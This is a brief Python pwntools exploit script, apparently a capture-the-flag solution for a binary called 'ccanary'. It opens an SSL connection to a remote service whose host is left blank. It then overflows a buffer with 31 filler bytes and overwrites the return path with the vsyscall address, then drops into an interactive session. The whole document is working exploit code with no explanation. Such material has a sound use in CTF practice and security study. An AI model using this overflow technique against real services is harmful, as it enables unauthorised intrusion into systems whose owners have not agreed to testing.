from pwn import *

HOST = ''
PORT = ''

# p = process('./ccanary')
p = remote(HOST, PORT, ssl = True)

p.recv()

payload = b'a'*31
payload += p64(0xffffffffff600000)	# vsyscall

p.sendline(payload)

p.interactive()